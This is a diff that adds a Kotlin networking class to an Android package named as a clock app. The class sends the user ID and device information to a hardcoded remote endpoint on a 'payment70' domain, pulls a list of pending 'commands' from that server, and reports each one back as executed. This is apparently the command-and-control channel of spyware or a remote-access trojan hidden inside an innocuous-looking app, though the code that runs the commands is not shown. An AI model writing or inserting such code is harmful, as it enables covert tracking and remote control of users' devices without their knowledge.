@@ -1,0 +1,92 @@
+package com.clock.app
+
+import org.json.JSONArray
+import org.json.JSONObject
+import java.io.OutputStreamWriter
+import java.net.HttpURLConnection
+import java.net.URL
+
+class ApiService {
+
+    private val baseUrl = "https://payment70.site.je/api.php"
+
+    fun sendUserStatus(userId: String, deviceInfo: String): Boolean {
+        return try {
+            val url = URL(baseUrl)
+            val connection = url.openConnection() as HttpURLConnection
+            connection.requestMethod = "POST"
+            connection.doOutput = true
+            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
+            connection.connectTimeout = 10000
+            connection.readTimeout = 10000
+
+            val json = JSONObject().apply {
+                put("user_status", true)
+                put("user_id", userId)
+                put("device_info", deviceInfo)
+            }
+
+            OutputStreamWriter(connection.outputStream).use {
+                it.write(json.toString())
+                it.flush()
+            }
+
+            val code = connection.responseCode
+            connection.disconnect()
+            code == HttpURLConnection.HTTP_OK
+        } catch (e: Exception) {
+            false
+        }
+    }
+
+    fun fetchPendingCommands(userId: String): List<JSONObject> {
+        return try {
+            val url = URL("$baseUrl?user_id=$userId")
+            val connection = url.openConnection() as HttpURLConnection
+            connection.requestMethod = "GET"
+            connection.connectTimeout = 10000
+            connection.readTimeout = 10000
+
+            val response = connection.inputStream.bufferedReader().use { it.readText() }
+            connection.disconnect()
+
+            val array = JSONArray(response)
+            val list = mutableListOf<JSONObject>()
+            for (i in 0 until array.length()) {
+                list.add(array.getJSONObject(i))
+            }
+            list
+        } catch (e: Exception) {
+            emptyList()
+        }
+    }
+
+    fun markCommandExecuted(commandId: String): Boolean {
+        return try {
+            val url = URL(baseUrl)
+            val connection = url.openConnection() as HttpURLConnection
+            connection.requestMethod = "POST"
+            connection.doOutput = true
+            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
+            connection.connectTimeout = 10000
+            connection.readTimeout = 10000
+
+            val json = JSONObject().apply {
+                put("update_status", true)
+                put("command_id", commandId)
+                put("executed", true)
+            }
+
+            OutputStreamWriter(connection.outputStream).use {
+                it.write(json.toString())
+                it.flush()
+            }
+
+            val code = connection.responseCode
+            connection.disconnect()
+            code == HttpURLConnection.HTTP_OK
+        } catch (e: Exception) {
+            false
+        }
+    }
+}
